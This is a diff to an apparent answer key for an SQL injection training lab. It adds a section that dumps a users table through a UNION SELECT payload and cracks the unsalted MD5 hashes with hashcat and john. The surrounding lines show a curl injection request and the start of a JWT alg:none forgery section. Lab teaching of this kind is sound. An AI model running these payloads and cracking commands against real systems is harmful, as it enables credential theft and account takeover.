@@ -39,6 +39,22 @@ curl -sG "$B/search.php" --data-urlencode "q=zzz%' UNION SELECT k,v,3 FROM secre
 **Result:** `FLAG{un10n_sql1_dumps_the_secrets_table}` + `admin_pw`. **Reason:** `"...name LIKE '%$q%'"`, 3 columns (name,category,price).
 Deck: SQLi_Course_Labs · SQLi_Exploitation_Methodology.
 
+**Bonus — dump + crack the `users` table** (realistic "SQLi → cracking → account takeover"):
+```
+# enumerate first: information_schema.tables -> products, users, secrets
+' UNION SELECT GROUP_CONCAT(username,0x3a,password,0x3a,role SEPARATOR 0x0a),2,3 FROM users-- -
+```
+→ usernames + **unsalted MD5** hashes + roles. Crack them:
+```
+# put the 32-char hashes one per line in hashes.txt, then:
+hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
+john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+# -> password1 / sunshine / dragon / letmein
+```
+`admin`'s hash is a strong password and won't crack from rockyou — **but it equals `secrets.admin_pw`
+(`Nexus!Adm1n#2026`)**, so the SQLi already gave it to you. Lesson: unsalted MD5 + a reused admin
+password turn a single SQLi into full account takeover.
+
 ## 2. JWT forgery  (`login.php` → `account.php`)
 **Answer:** the verifier accepts **`alg:none`** *and* signs HS256 with a **weak secret** (`secret`). Either path forges `role=admin`.
 **Command (alg:none — no signature needed):**
